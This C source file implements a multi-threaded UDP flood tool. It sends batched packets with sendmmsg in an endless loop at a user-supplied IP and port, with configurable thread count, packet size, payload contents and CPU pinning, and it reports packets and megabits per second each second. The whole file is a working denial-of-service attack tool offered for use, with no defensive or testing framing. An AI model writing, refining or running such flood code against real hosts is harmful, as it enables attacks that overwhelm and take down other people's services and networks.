#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <fcntl.h>
#include <time.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <pthread.h>

#define MAX_BATCH 128
#define SO_SNDBUF_SIZE (1024 * 1024 * 4)
#define STACK_SIZE (1024 * 1024)

int pps_counter = 0;
int mbps_counter = 0;
int use_affinity = 0;

struct thread_args {
    char ip[64];
    int port;
    int packet_size;
    char* payload;
    int core_id;
};

int udp_flood(void* arg) {
    struct thread_args* args = (struct thread_args*)arg;

    if (use_affinity) {
        cpu_set_t cpuset;
        CPU_ZERO(&cpuset);
        CPU_SET(args->core_id, &cpuset);
        sched_setaffinity(0, sizeof(cpuset), &cpuset);
    }

    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd < 0) exit(1);

    int sndbuf = SO_SNDBUF_SIZE;
    int enable = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &enable, sizeof(enable));
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    fcntl(sockfd, F_SETFL, O_NONBLOCK);

    struct sockaddr_in target = {0};
    target.sin_family = AF_INET;
    target.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &target.sin_addr);

    struct mmsghdr msgs[MAX_BATCH];
    struct iovec iovs[MAX_BATCH];

    for (int i = 0; i < MAX_BATCH; ++i) {
        iovs[i].iov_base = args->payload;
        iovs[i].iov_len = args->packet_size;
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &target;
        msgs[i].msg_hdr.msg_namelen = sizeof(target);
    }

    while (1) {
        int sent = sendmmsg(sockfd, msgs, MAX_BATCH, 0);
        if (sent > 0) {
            __sync_fetch_and_add(&pps_counter, sent);
            __sync_fetch_and_add(&mbps_counter, sent * args->packet_size);
        }
    }

    return 0;
}

void fill_payload(char* buffer, int size, const char* mode) {
    if (strcmp(mode, "null") == 0) {
        memset(buffer, 0, size);
    } else if (strcmp(mode, "text") == 0) {
        memset(buffer, 'A', size);
    } else if (strcmp(mode, "ascii") == 0) {
        for (int i = 0; i < size; ++i) {
            buffer[i] = (char)(33 + rand() % 94);
        }
    } else {
        for (int i = 0; i < size; ++i) {
            buffer[i] = (char)(rand() % 256);
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 7) {
        fprintf(stderr, "Usage: %s <ip> <port> <threads> <packet_size> <payload_mode> <affinity 0|1>\n", argv[0]);
        return 1;
    }

    char* ip = argv[1];
    int port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    int packet_size = atoi(argv[4]);
    char* payload_mode = argv[5];
    use_affinity = atoi(argv[6]);

    srand(time(NULL));

    char* payload = mmap(NULL, packet_size, PROT_READ | PROT_WRITE,
                         MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (!payload) {
        perror("mmap");
        return 1;
    }
    fill_payload(payload, packet_size, payload_mode);

    for (int i = 0; i < threads; ++i) {
        void* stack = mmap(NULL, STACK_SIZE, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
        if (!stack) exit(1);

        struct thread_args* args = malloc(sizeof(struct thread_args));
        strncpy(args->ip, ip, sizeof(args->ip) - 1);
        args->port = port;
        args->packet_size = packet_size;
        args->payload = payload;
        args->core_id = i;

        clone(udp_flood, stack + STACK_SIZE, CLONE_VM | CLONE_FS | CLONE_FILES | SIGCHLD, args);
    }

    while (1) {
        sleep(1);
        int pps = __sync_lock_test_and_set(&pps_counter, 0);
        int bytes = __sync_lock_test_and_set(&mbps_counter, 0);
        double mbps = (bytes * 8.0) / 1000000.0;
        double MBps = bytes / 1000000.0;
        fprintf(stderr, "PPS: %6d | Mbps: %7.2f | MBps: %7.2f\n", pps, mbps, MBps);
    }

    return 0;
}
